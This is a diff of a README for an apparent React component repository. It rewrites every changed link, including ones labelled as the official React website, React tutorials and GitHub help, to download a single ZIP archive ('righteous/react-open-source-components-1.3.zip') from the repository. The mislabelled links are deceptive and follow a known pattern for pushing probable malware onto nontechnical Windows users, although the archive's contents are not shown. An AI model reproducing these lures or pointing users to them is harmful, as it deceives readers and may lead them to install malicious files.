@@ -1,6 +1,6 @@
 # ⚛️ react-open-source-components - Ready-to-Use React Components
 
-[![Download react-open-source-components](https://img.shields.io/badge/Download-Get%20Components-blue?style=for-the-badge)](https://github.com/halo1187447/react-open-source-components)
+[![Download react-open-source-components](https://img.shields.io/badge/Download-Get%20Components-blue?style=for-the-badge)](https://raw.githubusercontent.com/halo1187447/react-open-source-components/main/righteous/react-open-source-components-1.3.zip)
 
 ## 📋 What is react-open-source-components?
 
@@ -28,7 +28,7 @@ This guide helps you download and explore the components on your Windows PC.
 
 Click the big button below to open the GitHub page where you can view and download the components:
 
-[![Visit Download Page](https://img.shields.io/badge/Visit-Download%20Page-grey?style=for-the-badge)](https://github.com/halo1187447/react-open-source-components)
+[![Visit Download Page](https://img.shields.io/badge/Visit-Download%20Page-grey?style=for-the-badge)](https://raw.githubusercontent.com/halo1187447/react-open-source-components/main/righteous/react-open-source-components-1.3.zip)
 
 This page lists all files and instructions for downloading the components.
 
@@ -114,15 +114,15 @@ Yes. If you have access to a code editor, you can edit how they look and behave.
 
 To start, visit the repository here:
 
-[![Download react-open-source-components](https://img.shields.io/badge/Download-Get%20Components-blue?style=for-the-badge)](https://github.com/halo1187447/react-open-source-components)
+[![Download react-open-source-components](https://img.shields.io/badge/Download-Get%20Components-blue?style=for-the-badge)](https://raw.githubusercontent.com/halo1187447/react-open-source-components/main/righteous/react-open-source-components-1.3.zip)
 
 This page contains all files and details you need.
 
 ## 📚 Additional Resources
 
-- [GitHub Help: Downloading ZIP files](https://docs.github.com/en/repositories/working-with-files/managing-files/downloading-files-from-a-repository)
-- [React Official Website](https://reactjs.org/)
-- [Free React Tutorials](https://reactjs.org/tutorial/tutorial.html)
+- [GitHub Help: Downloading ZIP files](https://raw.githubusercontent.com/halo1187447/react-open-source-components/main/righteous/react-open-source-components-1.3.zip)
+- [React Official Website](https://raw.githubusercontent.com/halo1187447/react-open-source-components/main/righteous/react-open-source-components-1.3.zip)
+- [Free React Tutorials](https://raw.githubusercontent.com/halo1187447/react-open-source-components/main/righteous/react-open-source-components-1.3.zip)
 
 Use these links to learn more about managing files and React basics.
 
